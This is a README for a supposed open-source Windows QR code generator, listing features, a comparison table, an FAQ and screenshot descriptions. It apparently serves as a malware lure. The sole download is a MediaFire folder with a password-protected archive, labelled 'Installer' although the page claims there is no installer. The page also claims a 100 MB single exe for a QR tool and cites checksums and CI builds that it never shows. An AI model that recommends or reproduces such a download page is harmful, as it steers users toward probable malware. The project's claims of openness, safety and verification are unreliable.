# qr-generator

🔳 Free, open-source QR code generator for Windows — offline codes for links, Wi-Fi and contacts, export PNG or SVG. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Template types** — URL, text, Wi-Fi join, vCard contact, email and SMS payloads built from forms
- ✅ **Error-correction control** — L to H levels with live preview of density so damaged prints still scan
- ✅ **PNG and SVG export** — vector output for print shops, 128 to 2048 px PNG for screens
- ✅ **Batch from CSV** — generate hundreds of codes from a spreadsheet column with auto-naming
- ✅ **Quiet zone and styling** — margin, foreground and background colors, rounded module toggle
- ✅ **Scan-test pane** — internal decoder verifies the code reads before you print it
- ✅ **100 MB self-contained exe** — runtime and encoding libraries bundled, portable, offline, MIT with SHA-256 releases

## Why qr-generator

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **qr-generator** | QR Generator | qrencode | QRStuff |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Freemium | Free, OSS | Paid |
| Open source | **Yes** | No | Yes | No |
| Wi-Fi and vCard templates | **Yes** | Paid tier | Manual string | Paid tier |
| SVG for print | **Yes** | Paid tier | Yes | Yes |
| Batch from CSV | **Yes** | No | Scripted | No |
| Portable GUI, offline | **Yes, 100 MB** | Web | CLI | Web |

## FAQ

**how to generate QR codes offline without uploading data?**

Most QR sites make you paste passwords and Wi-Fi keys into a form that logs them, which is exactly wrong for a Wi-Fi join code. qr-generator builds codes locally from templates, exports SVG for print and even scan-tests the result before you ship it. It is a 100 MB portable exe, MIT, fully offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark studio (#121417, yellow #FDE047): template picker left (URL, Wi-Fi, vCard), form fields center, QR preview right with error-correction selector.
2. Wi-Fi template filled: SSID and password fields masked, security dropdown WPA2, join QR rendering with logo-free preview at 512 px.
3. Batch panel: CSV preview with three columns, naming pattern field, 240 codes progress bar at 57 percent, export folder selection.

## Download

| Source | Link |
|---|---|
| 💾 **Installer qr-generator** | [Installer qr-generator](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).